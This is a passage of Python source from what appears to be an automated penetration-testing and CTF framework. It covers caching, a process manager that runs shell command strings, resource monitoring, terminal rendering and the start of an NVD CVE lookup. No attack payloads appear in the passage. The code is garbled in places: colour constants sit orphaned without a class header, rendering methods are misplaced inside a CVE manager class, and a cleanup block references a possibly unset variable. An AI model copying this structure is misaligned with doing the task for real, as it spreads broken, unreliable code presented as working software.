                "performance_metrics": self.performance_metrics.copy(),
                "min_workers": self.min_workers,
                "max_workers": self.max_workers
            }

class AdvancedCache:
    """Advanced caching system with intelligent TTL and LRU eviction"""

    def __init__(self, max_size=1000, default_ttl=3600):
        self.max_size = max_size
        self.default_ttl = default_ttl
        self.cache = {}
        self.access_times = {}
        self.ttl_times = {}
        self.cache_lock = threading.RLock()
        self.hit_count = 0
        self.miss_count = 0

        # Start cleanup thread
        self.cleanup_thread = threading.Thread(target=self._cleanup_expired, daemon=True)
        self.cleanup_thread.start()

    def get(self, key: str) -> Any:
        """Get value from cache"""
        with self.cache_lock:
            current_time = time.time()

            # Check if key exists and is not expired
            if key in self.cache and (key not in self.ttl_times or self.ttl_times[key] > current_time):
                # Update access time for LRU
                self.access_times[key] = current_time
                self.hit_count += 1
                return self.cache[key]

            # Cache miss or expired
            if key in self.cache:
                # Remove expired entry
                self._remove_key(key)

            self.miss_count += 1
            return None

    def set(self, key: str, value: Any, ttl: int = None) -> None:
        """Set value in cache with optional TTL"""
        with self.cache_lock:
            current_time = time.time()

            # Use default TTL if not specified
            if ttl is None:
                ttl = self.default_ttl

            # Check if we need to evict entries
            if len(self.cache) >= self.max_size and key not in self.cache:
                self._evict_lru()

            # Set the value
            self.cache[key] = value
            self.access_times[key] = current_time
            self.ttl_times[key] = current_time + ttl

    def delete(self, key: str) -> bool:
        """Delete key from cache"""
        with self.cache_lock:
            if key in self.cache:
                self._remove_key(key)
                return True
            return False

    def clear(self) -> None:
        """Clear all cache entries"""
        with self.cache_lock:
            self.cache.clear()
            self.access_times.clear()
            self.ttl_times.clear()

    def _remove_key(self, key: str) -> None:
        """Remove key and associated metadata"""
        self.cache.pop(key, None)
        self.access_times.pop(key, None)
        self.ttl_times.pop(key, None)

    def _evict_lru(self) -> None:
        """Evict least recently used entry"""
        if not self.access_times:
            return

        # Find least recently used key
        lru_key = min(self.access_times.keys(), key=lambda k: self.access_times[k])
        self._remove_key(lru_key)
        logger.debug(f"🗑️ Evicted LRU cache entry: {lru_key}")

    def _cleanup_expired(self) -> None:
        """Cleanup expired entries periodically"""
        while True:
            try:
                time.sleep(60)  # Cleanup every minute
                current_time = time.time()
                expired_keys = []

                with self.cache_lock:
                    for key, expiry_time in self.ttl_times.items():
                        if expiry_time <= current_time:
                            expired_keys.append(key)

                    for key in expired_keys:
                        self._remove_key(key)

                if expired_keys:
                    logger.debug(f"🧹 Cleaned up {len(expired_keys)} expired cache entries")

            except Exception as e:
                logger.error(f"💥 Cache cleanup error: {str(e)}")

    def get_stats(self) -> Dict[str, Any]:
        """Get cache statistics"""
        with self.cache_lock:
            total_requests = self.hit_count + self.miss_count
            hit_rate = (self.hit_count / total_requests * 100) if total_requests > 0 else 0

            return {
                "size": len(self.cache),
                "max_size": self.max_size,
                "hit_count": self.hit_count,
                "miss_count": self.miss_count,
                "hit_rate": hit_rate,
                "utilization": (len(self.cache) / self.max_size * 100)
            }

class EnhancedProcessManager:
    """Advanced process management with intelligent resource allocation"""

    def __init__(self):
        self.process_pool = ProcessPool(min_workers=4, max_workers=32)
        self.cache = AdvancedCache(max_size=2000, default_ttl=1800)  # 30 minutes default TTL
        self.resource_monitor = ResourceMonitor()
        self.process_registry = {}
        self.registry_lock = threading.RLock()
        self.performance_dashboard = PerformanceDashboard()

        # Process termination and recovery
        self.termination_handlers = {}
        self.recovery_strategies = {}

        # Auto-scaling configuration
        self.auto_scaling_enabled = True
        self.resource_thresholds = {
            "cpu_high": 85.0,
            "memory_high": 90.0,
            "disk_high": 95.0,
            "load_high": 0.8
        }

        # Start background monitoring
        self.monitor_thread = threading.Thread(target=self._monitor_system, daemon=True)
        self.monitor_thread.start()

    def execute_command_async(self, command: str, context: Dict[str, Any] = None) -> str:
        """Execute command asynchronously using process pool"""
        task_id = f"cmd_{int(time.time() * 1000)}_{hash(command) % 10000}"

        # Check cache first
        cache_key = f"cmd_result_{hash(command)}"
        cached_result = self.cache.get(cache_key)
        if cached_result and context and context.get("use_cache", True):
            logger.info(f"📋 Using cached result for command: {command[:50]}...")
            return cached_result

        # Submit to process pool
        self.process_pool.submit_task(
            task_id,
            self._execute_command_internal,
            command,
            context or {}
        )

        return task_id

    def _execute_command_internal(self, command: str, context: Dict[str, Any]) -> Dict[str, Any]:
        """Internal command execution with enhanced monitoring"""
        start_time = time.time()

        try:
            # Resource-aware execution
            resource_usage = self.resource_monitor.get_current_usage()

            # Adjust command based on resource availability
            if resource_usage["cpu_percent"] > self.resource_thresholds["cpu_high"]:
                # Add nice priority for CPU-intensive commands
                if not command.startswith("nice"):
                    command = f"nice -n 10 {command}"

            # Execute command
            process = subprocess.Popen(
                command,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                preexec_fn=os.setsid if os.name != 'nt' else None
            )

            # Register process
            with self.registry_lock:
                self.process_registry[process.pid] = {
                    "command": command,
                    "process": process,
                    "start_time": start_time,
                    "context": context,
                    "status": "running"
                }

            # Monitor process execution
            stdout, stderr = process.communicate()
            execution_time = time.time() - start_time

            result = {
                "success": process.returncode == 0,
                "stdout": stdout,
                "stderr": stderr,
                "return_code": process.returncode,
                "execution_time": execution_time,
                "pid": process.pid,
                "resource_usage": self.resource_monitor.get_process_usage(process.pid)
            }

            # Cache successful results
            if result["success"] and context.get("cache_result", True):
                cache_key = f"cmd_result_{hash(command)}"
                cache_ttl = context.get("cache_ttl", 1800)  # 30 minutes default
                self.cache.set(cache_key, result, cache_ttl)

            # Update performance metrics
            self.performance_dashboard.record_execution(command, result)

            return result

        except Exception as e:
            execution_time = time.time() - start_time
            error_result = {
                "success": False,
                "stdout": "",
                "stderr": str(e),
                "return_code": -1,
                "execution_time": execution_time,
                "error": str(e)
            }

            self.performance_dashboard.record_execution(command, error_result)
            return error_result

        finally:
            # Cleanup process registry
            with self.registry_lock:
                if hasattr(process, 'pid') and process.pid in self.process_registry:
                    del self.process_registry[process.pid]

    def get_task_result(self, task_id: str) -> Dict[str, Any]:
        """Get result of async task"""
        return self.process_pool.get_task_result(task_id)

    def terminate_process_gracefully(self, pid: int, timeout: int = 30) -> bool:
        """Terminate process with graceful degradation"""
        try:
            with self.registry_lock:
                if pid not in self.process_registry:
                    return False

                process_info = self.process_registry[pid]
                process = process_info["process"]

                # Try graceful termination first
                process.terminate()

                # Wait for graceful termination
                try:
                    process.wait(timeout=timeout)
                    process_info["status"] = "terminated_gracefully"
                    logger.info(f"✅ Process {pid} terminated gracefully")
                    return True
                except subprocess.TimeoutExpired:
                    # Force kill if graceful termination fails
                    process.kill()
                    process_info["status"] = "force_killed"
                    logger.warning(f"⚠️ Process {pid} force killed after timeout")
                    return True

        except Exception as e:
            logger.error(f"💥 Error terminating process {pid}: {str(e)}")
            return False

    def _monitor_system(self):
        """Monitor system resources and auto-scale"""
        while True:
            try:
                time.sleep(15)  # Monitor every 15 seconds

                # Get current resource usage
                resource_usage = self.resource_monitor.get_current_usage()

                # Auto-scaling based on resource usage
                if self.auto_scaling_enabled:
                    self._auto_scale_based_on_resources(resource_usage)

                # Update performance dashboard
                self.performance_dashboard.update_system_metrics(resource_usage)

            except Exception as e:
                logger.error(f"💥 System monitoring error: {str(e)}")

    def _auto_scale_based_on_resources(self, resource_usage: Dict[str, float]):
        """Auto-scale process pool based on resource usage"""
        pool_stats = self.process_pool.get_pool_stats()
        current_workers = pool_stats["active_workers"]

        # Scale down if resources are constrained
        if (resource_usage["cpu_percent"] > self.resource_thresholds["cpu_high"] or
            resource_usage["memory_percent"] > self.resource_thresholds["memory_high"]):

            if current_workers > self.process_pool.min_workers:
                self.process_pool._scale_down(1)
                logger.info(f"📉 Auto-scaled down due to high resource usage: CPU {resource_usage['cpu_percent']:.1f}%, Memory {resource_usage['memory_percent']:.1f}%")

        # Scale up if resources are available and there's demand
        elif (resource_usage["cpu_percent"] < 60 and
              resource_usage["memory_percent"] < 70 and
              pool_stats["queue_size"] > 2):

            if current_workers < self.process_pool.max_workers:
                self.process_pool._scale_up(1)
                logger.info(f"📈 Auto-scaled up due to available resources and demand")

    def get_comprehensive_stats(self) -> Dict[str, Any]:
        """Get comprehensive system and process statistics"""
        return {
            "process_pool": self.process_pool.get_pool_stats(),
            "cache": self.cache.get_stats(),
            "resource_usage": self.resource_monitor.get_current_usage(),
            "active_processes": len(self.process_registry),
            "performance_dashboard": self.performance_dashboard.get_summary(),
            "auto_scaling_enabled": self.auto_scaling_enabled,
            "resource_thresholds": self.resource_thresholds
        }

class ResourceMonitor:
    """Advanced resource monitoring with historical tracking"""

    def __init__(self, history_size=100):
        self.history_size = history_size
        self.usage_history = []
        self.history_lock = threading.Lock()

    def get_current_usage(self) -> Dict[str, float]:
        """Get current system resource usage"""
        try:
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
            network = psutil.net_io_counters()

            usage = {
                "cpu_percent": cpu_percent,
                "memory_percent": memory.percent,
                "memory_available_gb": memory.available / (1024**3),
                "disk_percent": disk.percent,
                "disk_free_gb": disk.free / (1024**3),
                "network_bytes_sent": network.bytes_sent,
                "network_bytes_recv": network.bytes_recv,
                "timestamp": time.time()
            }

            # Add to history
            with self.history_lock:
                self.usage_history.append(usage)
                if len(self.usage_history) > self.history_size:
                    self.usage_history.pop(0)

            return usage

        except Exception as e:
            logger.error(f"💥 Error getting resource usage: {str(e)}")
            return {
                "cpu_percent": 0,
                "memory_percent": 0,
                "memory_available_gb": 0,
                "disk_percent": 0,
                "disk_free_gb": 0,
                "network_bytes_sent": 0,
                "network_bytes_recv": 0,
                "timestamp": time.time()
            }

    def get_process_usage(self, pid: int) -> Dict[str, Any]:
        """Get resource usage for specific process"""
        try:
            process = psutil.Process(pid)
            return {
                "cpu_percent": process.cpu_percent(),
                "memory_percent": process.memory_percent(),
                "memory_rss_mb": process.memory_info().rss / (1024**2),
                "num_threads": process.num_threads(),
                "status": process.status()
            }
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            return {}

    def get_usage_trends(self) -> Dict[str, Any]:
        """Get resource usage trends"""
        with self.history_lock:
            if len(self.usage_history) < 2:
                return {}

            recent = self.usage_history[-10:]  # Last 10 measurements

            cpu_trend = sum(u["cpu_percent"] for u in recent) / len(recent)
            memory_trend = sum(u["memory_percent"] for u in recent) / len(recent)

            return {
                "cpu_avg_10": cpu_trend,
                "memory_avg_10": memory_trend,
                "measurements": len(self.usage_history),
                "trend_period_minutes": len(recent) * 15 / 60  # 15 second intervals
            }

class PerformanceDashboard:
    """Real-time performance monitoring dashboard"""

    def __init__(self):
        self.execution_history = []
        self.system_metrics = []
        self.dashboard_lock = threading.Lock()
        self.max_history = 1000

    def record_execution(self, command: str, result: Dict[str, Any]):
        """Record command execution for performance tracking"""
        with self.dashboard_lock:
            execution_record = {
                "command": command[:100],  # Truncate long commands
                "success": result.get("success", False),
                "execution_time": result.get("execution_time", 0),
                "return_code": result.get("return_code", -1),
                "timestamp": time.time()
            }

            self.execution_history.append(execution_record)
            if len(self.execution_history) > self.max_history:
                self.execution_history.pop(0)

    def update_system_metrics(self, metrics: Dict[str, Any]):
        """Update system metrics for dashboard"""
        with self.dashboard_lock:
            self.system_metrics.append(metrics)
            if len(self.system_metrics) > self.max_history:
                self.system_metrics.pop(0)

    def get_summary(self) -> Dict[str, Any]:
        """Get performance summary"""
        with self.dashboard_lock:
            if not self.execution_history:
                return {"executions": 0}

            recent_executions = self.execution_history[-100:]  # Last 100 executions

            total_executions = len(recent_executions)
            successful_executions = sum(1 for e in recent_executions if e["success"])
            avg_execution_time = sum(e["execution_time"] for e in recent_executions) / total_executions

            return {
                "total_executions": len(self.execution_history),
                "recent_executions": total_executions,
                "success_rate": (successful_executions / total_executions * 100) if total_executions > 0 else 0,
                "avg_execution_time": avg_execution_time,
                "system_metrics_count": len(self.system_metrics)
            }

# Global instances
tech_detector = TechnologyDetector()
rate_limiter = RateLimitDetector()
failure_recovery = FailureRecoverySystem()
performance_monitor = PerformanceMonitor()
parameter_optimizer = ParameterOptimizer()
enhanced_process_manager = EnhancedProcessManager()

# Global CTF framework instances
ctf_manager = CTFWorkflowManager()
ctf_tools = CTFToolManager()
ctf_automator = CTFChallengeAutomator()
ctf_coordinator = CTFTeamCoordinator()

# ============================================================================
# PROCESS MANAGEMENT FOR COMMAND TERMINATION (v5.0 ENHANCEMENT)
# ============================================================================

# Process management for command termination
active_processes = {}  # pid -> process info
process_lock = threading.Lock()

class ProcessManager:
    """Enhanced process manager for command termination and monitoring"""

    @staticmethod
    def register_process(pid, command, process_obj):
        """Register a new active process"""
        with process_lock:
            active_processes[pid] = {
                "pid": pid,
                "command": command,
                "process": process_obj,
                "start_time": time.time(),
                "status": "running",
                "progress": 0.0,
                "last_output": "",
                "bytes_processed": 0
            }
            logger.info(f"🆔 REGISTERED: Process {pid} - {command[:50]}...")

    @staticmethod
    def update_process_progress(pid, progress, last_output="", bytes_processed=0):
        """Update process progress and stats"""
        with process_lock:
            if pid in active_processes:
                active_processes[pid]["progress"] = progress
                active_processes[pid]["last_output"] = last_output
                active_processes[pid]["bytes_processed"] = bytes_processed
                runtime = time.time() - active_processes[pid]["start_time"]

                # Calculate ETA if progress > 0
                eta = 0
                if progress > 0:
                    eta = (runtime / progress) * (1.0 - progress)

                active_processes[pid]["runtime"] = runtime
                active_processes[pid]["eta"] = eta

    @staticmethod
    def terminate_process(pid):
        """Terminate a specific process"""
        with process_lock:
            if pid in active_processes:
                process_info = active_processes[pid]
                try:
                    process_obj = process_info["process"]
                    if process_obj and process_obj.poll() is None:
                        process_obj.terminate()
                        time.sleep(1)  # Give it a chance to terminate gracefully
                        if process_obj.poll() is None:
                            process_obj.kill()  # Force kill if still running

                        active_processes[pid]["status"] = "terminated"
                        logger.warning(f"🛑 TERMINATED: Process {pid} - {process_info['command'][:50]}...")
                        return True
                except Exception as e:
                    logger.error(f"💥 Error terminating process {pid}: {str(e)}")
                    return False
            return False

    @staticmethod
    def cleanup_process(pid):
        """Remove process from active registry"""
        with process_lock:
            if pid in active_processes:
                process_info = active_processes.pop(pid)
                logger.info(f"🧹 CLEANUP: Process {pid} removed from registry")
                return process_info
            return None

    @staticmethod
    def get_process_status(pid):
        """Get status of a specific process"""
        with process_lock:
            return active_processes.get(pid, None)

    @staticmethod
    def list_active_processes():
        """List all active processes"""
        with process_lock:
            return dict(active_processes)

    @staticmethod
    def pause_process(pid):
        """Pause a specific process (SIGSTOP)"""
        with process_lock:
            if pid in active_processes:
                try:
                    process_obj = active_processes[pid]["process"]
                    if process_obj and process_obj.poll() is None:
                        os.kill(pid, signal.SIGSTOP)
                        active_processes[pid]["status"] = "paused"
                        logger.info(f"⏸️  PAUSED: Process {pid}")
                        return True
                except Exception as e:
                    logger.error(f"💥 Error pausing process {pid}: {str(e)}")
            return False

    @staticmethod
    def resume_process(pid):
        """Resume a paused process (SIGCONT)"""
        with process_lock:
            if pid in active_processes:
                try:
                    process_obj = active_processes[pid]["process"]
                    if process_obj and process_obj.poll() is None:
                        os.kill(pid, signal.SIGCONT)
                        active_processes[pid]["status"] = "running"
                        logger.info(f"▶️  RESUMED: Process {pid}")
                        return True
                except Exception as e:
                    logger.error(f"💥 Error resuming process {pid}: {str(e)}")
            return False

# Enhanced color codes and visual elements for modern terminal output
# All color references consolidated to ModernVisualEngine.COLORS for consistency
    BG_GREEN = '\033[42m'
    BG_YELLOW = '\033[43m'
    BG_BLUE = '\033[44m'
    BG_MAGENTA = '\033[45m'
    BG_CYAN = '\033[46m'
    BG_WHITE = '\033[47m'

    # Text effects
    DIM = '\033[2m'
    UNDERLINE = '\033[4m'
    BLINK = '\033[5m'
    REVERSE = '\033[7m'
    STRIKETHROUGH = '\033[9m'

class PythonEnvironmentManager:
    """Manage Python virtual environments and dependencies"""

    def __init__(self, base_dir: str = "/tmp/hexstrike_envs"):
        self.base_dir = Path(base_dir)
        self.base_dir.mkdir(exist_ok=True)

    def create_venv(self, env_name: str) -> Path:
        """Create a new virtual environment"""
        env_path = self.base_dir / env_name
        if not env_path.exists():
            logger.info(f"🐍 Creating virtual environment: {env_name}")
            venv.create(env_path, with_pip=True)
        return env_path

    def install_package(self, env_name: str, package: str) -> bool:
        """Install a package in the specified environment"""
        env_path = self.create_venv(env_name)
        pip_path = env_path / "bin" / "pip"

        try:
            result = subprocess.run([str(pip_path), "install", package],
                                  capture_output=True, text=True, timeout=300)
            if result.returncode == 0:
                logger.info(f"📦 Installed package {package} in {env_name}")
                return True
            else:
                logger.error(f"❌ Failed to install {package}: {result.stderr}")
                return False
        except Exception as e:
            logger.error(f"💥 Error installing package {package}: {e}")
            return False

    def get_python_path(self, env_name: str) -> str:
        """Get Python executable path for environment"""
        env_path = self.create_venv(env_name)
        return str(env_path / "bin" / "python")

# Global environment manager
env_manager = PythonEnvironmentManager()

# ============================================================================
# ADVANCED VULNERABILITY INTELLIGENCE SYSTEM (v6.0 ENHANCEMENT)
# ============================================================================

class CVEIntelligenceManager:
    """Advanced CVE Intelligence and Vulnerability Management System"""

    def __init__(self):
        self.cve_cache = {}
        self.vulnerability_db = {}
        self.threat_intelligence = {}

    @staticmethod
    def create_banner():
        """Reuse unified ModernVisualEngine banner (legacy hook)."""
        return ModernVisualEngine.create_banner()

    @staticmethod
    def render_progress_bar(progress: float, width: int = 40, style: str = 'cyber',
                          label: str = "", eta: float = 0, speed: str = "") -> str:
        """Render a beautiful progress bar with multiple styles"""

        # Clamp progress between 0 and 1
        progress = max(0.0, min(1.0, progress))

        # Calculate filled and empty portions
        filled_width = int(width * progress)
        empty_width = width - filled_width

        # Style-specific rendering
        if style == 'cyber':
            filled_char = '█'; empty_char = '░'
            bar_color = ModernVisualEngine.COLORS['ACCENT_LINE']
            progress_color = ModernVisualEngine.COLORS['PRIMARY_BORDER']
        elif style == 'matrix':
            filled_char = '▓'; empty_char = '▒'
            bar_color = ModernVisualEngine.COLORS['ACCENT_LINE']
            progress_color = ModernVisualEngine.COLORS['ACCENT_GRADIENT']
        elif style == 'neon':
            filled_char = '━'; empty_char = '─'
            bar_color = ModernVisualEngine.COLORS['PRIMARY_BORDER']
            progress_color = ModernVisualEngine.COLORS['CYBER_ORANGE']
        else:
            filled_char = '█'; empty_char = '░'
            bar_color = ModernVisualEngine.COLORS['ACCENT_LINE']
            progress_color = ModernVisualEngine.COLORS['PRIMARY_BORDER']

        # Build the progress bar
        filled_part = bar_color + filled_char * filled_width
        empty_part = ModernVisualEngine.COLORS['TERMINAL_GRAY'] + empty_char * empty_width
        percentage = f"{progress * 100:.1f}%"

        # Add ETA and speed if provided
        eta_str = f" | ETA: {eta:.0f}s" if eta > 0 else ""
        speed_str = f" | {speed}" if speed else ""

        # Construct the full progress bar
        bar = f"{progress_color}[{filled_part}{empty_part}{ModernVisualEngine.COLORS['RESET']}{progress_color}] {percentage}{eta_str}{speed_str}{ModernVisualEngine.COLORS['RESET']}"

        if label:
            return f"{ModernVisualEngine.COLORS['BOLD']}{label}{ModernVisualEngine.COLORS['RESET']} {bar}"
        return bar

    @staticmethod
    def render_vulnerability_card(vuln_data: Dict[str, Any]) -> str:
        """Render vulnerability as a beautiful card with severity indicators"""

        severity = vuln_data.get('severity', 'info').lower()
        title = vuln_data.get('title', 'Unknown Vulnerability')
        url = vuln_data.get('url', 'N/A')
        description = vuln_data.get('description', 'No description available')
        cvss = vuln_data.get('cvss_score', 0.0)

        # Get severity color
        severity_color = ModernVisualEngine.COLORS['HACKER_RED'] if severity == 'critical' else ModernVisualEngine.COLORS['HACKER_RED'] if severity == 'high' else ModernVisualEngine.COLORS['CYBER_ORANGE'] if severity == 'medium' else ModernVisualEngine.COLORS['CYBER_ORANGE'] if severity == 'low' else ModernVisualEngine.COLORS['NEON_BLUE']

        # Severity indicators
        severity_indicators = {
            'critical': '🔥 CRITICAL',
            'high': '⚠️  HIGH',
            'medium': '📊 MEDIUM',
            'low': '📝 LOW',
            'info': 'ℹ️  INFO'
        }

        severity_badge = severity_indicators.get(severity, '❓ UNKNOWN')

        # Create the vulnerability card
        card = f"""
{ModernVisualEngine.COLORS['BOLD']}╭─────────────────────────────────────────────────────────────────────────────╮{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {severity_color}{severity_badge}{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['BOLD']}{title[:60]}{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}├─────────────────────────────────────────────────────────────────────────────┤{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['NEON_BLUE']}🎯 Target:{ModernVisualEngine.COLORS['RESET']} {url[:65]}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['CYBER_ORANGE']}📊 CVSS:{ModernVisualEngine.COLORS['RESET']} {cvss}/10.0
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['CYBER_ORANGE']}📋 Description:{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']}   {description[:70]}
{ModernVisualEngine.COLORS['BOLD']}╰─────────────────────────────────────────────────────────────────────────────╯{ModernVisualEngine.COLORS['RESET']}
"""
        return card

    @staticmethod
    def create_live_dashboard(processes: Dict[int, Dict[str, Any]]) -> str:
        """Create a live dashboard showing all active processes"""

        if not processes:
            return f"{ModernVisualEngine.COLORS['TERMINAL_GRAY']}📊 No active processes{ModernVisualEngine.COLORS['RESET']}"

        dashboard = f"""
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╔══════════════════════════════════════════════════════════════════════════════╗
║                           🚀 LIVE PROCESS DASHBOARD                          ║
╠══════════════════════════════════════════════════════════════════════════════╣{ModernVisualEngine.COLORS['RESET']}
"""

        for pid, proc_info in processes.items():
            command = proc_info.get('command', 'Unknown')[:50]
            status = proc_info.get('status', 'unknown')
            progress = proc_info.get('progress', 0.0)
            runtime = proc_info.get('runtime', 0)
            eta = proc_info.get('eta', 0)

            # Status color coding
            status_colors = {
                'running': ModernVisualEngine.COLORS['MATRIX_GREEN'],
                'paused': ModernVisualEngine.COLORS['WARNING'],
                'terminated': ModernVisualEngine.COLORS['ERROR'],
                'completed': ModernVisualEngine.COLORS['NEON_BLUE']
            }
            status_color = status_colors.get(status, ModernVisualEngine.COLORS['BRIGHT_WHITE'])

            # Create mini progress bar
            mini_bar = ModernVisualEngine.render_progress_bar(
                progress, width=20, style='cyber', eta=eta
            )

            dashboard += f"""{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['NEON_BLUE']}PID {pid}{ModernVisualEngine.COLORS['RESET']} │ {status_color}{status.upper()}{ModernVisualEngine.COLORS['RESET']} │ {runtime:.1f}s │ {command}...
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {mini_bar}
{ModernVisualEngine.COLORS['BOLD']}╠──────────────────────────────────────────────────────────────────────────────╣{ModernVisualEngine.COLORS['RESET']}
"""

        dashboard += f"{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╚══════════════════════════════════════════════════════════════════════════════╝{ModernVisualEngine.COLORS['RESET']}"

        return dashboard

    @staticmethod
    def format_tool_output(tool: str, output: str, success: bool = True) -> str:
        """Format tool output with syntax highlighting and structure"""

        # Get tool icon
        tool_icon = '🛠️'  # Default tool icon

        # Status indicator
        status_icon = "✅" if success else "❌"
        status_color = ModernVisualEngine.COLORS['MATRIX_GREEN'] if success else ModernVisualEngine.COLORS['HACKER_RED']

        # Format the output with structure
        formatted_output = f"""
{ModernVisualEngine.COLORS['BOLD']}╭─ {tool_icon} {tool.upper()} OUTPUT ─────────────────────────────────────────────╮{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {status_color}{status_icon} Status: {'SUCCESS' if success else 'FAILED'}{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}├─────────────────────────────────────────────────────────────────────────────┤{ModernVisualEngine.COLORS['RESET']}
"""

        # Process output lines with syntax highlighting
        lines = output.split('\n')
        for line in lines[:20]:  # Limit to first 20 lines for readability
            if line.strip():
                # Basic syntax highlighting
                if any(keyword in line.lower() for keyword in ['error', 'failed', 'denied']):
                    formatted_output += f"{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['ERROR']}{line[:75]}{ModernVisualEngine.COLORS['RESET']}\n"
                elif any(keyword in line.lower() for keyword in ['found', 'discovered', 'vulnerable']):
                    formatted_output += f"{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['MATRIX_GREEN']}{line[:75]}{ModernVisualEngine.COLORS['RESET']}\n"
                elif any(keyword in line.lower() for keyword in ['warning', 'timeout']):
                    formatted_output += f"{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['WARNING']}{line[:75]}{ModernVisualEngine.COLORS['RESET']}\n"
                else:
                    formatted_output += f"{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['BRIGHT_WHITE']}{line[:75]}{ModernVisualEngine.COLORS['RESET']}\n"

        if len(lines) > 20:
            formatted_output += f"{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['TERMINAL_GRAY']}... ({len(lines) - 20} more lines truncated){ModernVisualEngine.COLORS['RESET']}\n"

        formatted_output += f"{ModernVisualEngine.COLORS['BOLD']}╰─────────────────────────────────────────────────────────────────────────────╯{ModernVisualEngine.COLORS['RESET']}"

        return formatted_output

    @staticmethod
    def create_summary_report(results: Dict[str, Any]) -> str:
        """Generate a beautiful summary report"""

        total_vulns = len(results.get('vulnerabilities', []))
        critical_vulns = len([v for v in results.get('vulnerabilities', []) if v.get('severity') == 'critical'])
        high_vulns = len([v for v in results.get('vulnerabilities', []) if v.get('severity') == 'high'])
        execution_time = results.get('execution_time', 0)
        tools_used = results.get('tools_used', [])

        report = f"""
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╔══════════════════════════════════════════════════════════════════════════════╗
║                              📊 SCAN SUMMARY REPORT                          ║
╠══════════════════════════════════════════════════════════════════════════════╣{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['NEON_BLUE']}🎯 Target:{ModernVisualEngine.COLORS['RESET']} {results.get('target', 'Unknown')[:60]}
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['CYBER_ORANGE']}⏱️  Duration:{ModernVisualEngine.COLORS['RESET']} {execution_time:.2f} seconds
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['WARNING']}🛠️  Tools Used:{ModernVisualEngine.COLORS['RESET']} {len(tools_used)} tools
{ModernVisualEngine.COLORS['BOLD']}╠──────────────────────────────────────────────────────────────────────────────╣{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['HACKER_RED']}🔥 Critical:{ModernVisualEngine.COLORS['RESET']} {critical_vulns} vulnerabilities
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['ERROR']}⚠️  High:{ModernVisualEngine.COLORS['RESET']} {high_vulns} vulnerabilities
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['MATRIX_GREEN']}📈 Total Found:{ModernVisualEngine.COLORS['RESET']} {total_vulns} vulnerabilities
{ModernVisualEngine.COLORS['BOLD']}╠──────────────────────────────────────────────────────────────────────────────╣{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}║{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['ELECTRIC_PURPLE']}🚀 Tools:{ModernVisualEngine.COLORS['RESET']} {', '.join(tools_used[:5])}{'...' if len(tools_used) > 5 else ''}
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╚══════════════════════════════════════════════════════════════════════════════╝{ModernVisualEngine.COLORS['RESET']}
"""
        return report

    def fetch_latest_cves(self, hours=24, severity_filter="HIGH,CRITICAL"):
        """Fetch latest CVEs from NVD and other real sources"""
        try:
            logger.info(f"🔍 Fetching CVEs from last {hours} hours with severity: {severity_filter}")
            
            # Calculate date range for CVE search
            end_date = datetime.now()
            start_date = end_date - timedelta(hours=hours)
            
            # Format dates for NVD API (ISO 8601 format)
            start_date_str = start_date.strftime('%Y-%m-%dT%H:%M:%S.000')
            end_date_str = end_date.strftime('%Y-%m-%dT%H:%M:%S.000')
            
            # NVD API endpoint
            nvd_url = "https://services.nvd.nist.gov/rest/json/cves/2.0"
            
            # Parse severity filter
            severity_levels = [s.strip().upper() for s in severity_filter.split(",")]
            
            all_cves = []
            
            # Query NVD API with rate limiting compliance
            params = {
                'lastModStartDate': start_date_str,
